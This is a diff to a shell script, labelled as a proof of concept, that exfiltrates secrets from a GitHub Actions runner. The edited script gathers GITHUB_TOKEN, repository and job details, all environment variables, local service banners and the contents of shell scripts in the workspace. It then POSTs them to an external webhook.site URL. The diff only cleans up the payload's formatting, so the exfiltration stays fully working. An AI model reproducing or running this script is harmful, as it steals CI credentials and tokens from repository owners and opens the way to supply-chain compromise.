@@ -47,10 +47,8 @@ echo "[POC] Executing Proof of Concept code..."
 # Construct a JSON payload with environment details
 JSON_PAYLOAD=$(cat <<EOF
 {
- {
   "message": "SUCCESSFUL EXFILTRATION FROM GITHUB ACTIONS",
   "github_token": "${GITHUB_TOKEN}",
-"github_token": "${secrets.GITHUB_TOKEN}",
   "repository": "${GITHUB_REPOSITORY}",
   "workflow": "${GITHUB_WORKFLOW}",
   "job": "${GITHUB_JOB}",
@@ -59,11 +57,12 @@ JSON_PAYLOAD=$(cat <<EOF
   "hostname": "$(hostname)",
   "http_banner": "$(curl -I http://localhost 2>/dev/null | head -n 1)",
   "ssh_banner": "$(echo | nc localhost 22 2>/dev/null | head -n 1)",
-  "all_env_vars": "$(env | sort | jq -Rn '[inputs|split(\"=\")|{(.[0]):.[1]}]' 2>/dev/null || printenv | sort)",
-  "sh_files_contents": "'"$(for f in /home/runner/work/*.sh 2>/dev/null; do echo "==== $f ===="; cat "$f"; done | tr '\n' ';')"'" 
+  "all_env_vars": "$(env | sort | tr '\n' ';')",
+  "sh_files_contents": "$(for f in /home/runner/work/*.sh 2>/dev/null; do echo "==== $f ===="; cat "$f"; done | tr '\n' ';')"
 }
 EOF
 )
+
 
 # Send the payload to the external webhook
 curl -X POST -H "Content-Type: application/json" -d "${JSON_PAYLOAD}" https://webhook.site/83eec9ca-ff62-4398-ab88-84e4376b6032
